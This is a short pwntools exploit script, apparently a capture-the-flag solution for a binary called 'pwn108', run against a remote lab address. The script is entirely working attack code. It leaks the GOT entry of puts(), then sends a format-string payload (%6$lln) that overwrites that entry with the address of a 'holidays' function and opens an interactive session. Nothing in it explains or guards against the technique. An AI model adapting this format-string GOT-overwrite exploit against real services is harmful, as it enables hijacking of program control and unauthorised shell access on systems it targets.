from pwn import *


context.update(arch="amd64", os="linux")

binary = ELF("./pwn108")
#process = process("./pwn108")
process = remote("10.10.132.26", 9008)

process.clean()
print(f"GOT entry fot puts(): {hex(binary.got.puts)}")
process.sendline(p64(binary.got.puts))

process.clean()
print(f"Address of holidays(): {str(binary.symbols.holidays)}")

fmt_str = b"%" + str(binary.symbols.holidays).encode("utf-8") + b"s%6$lln"
print(f"Format string: " + fmt_str.decode("utf-8"))

process.sendline(fmt_str)
process.clean()

process.interactive()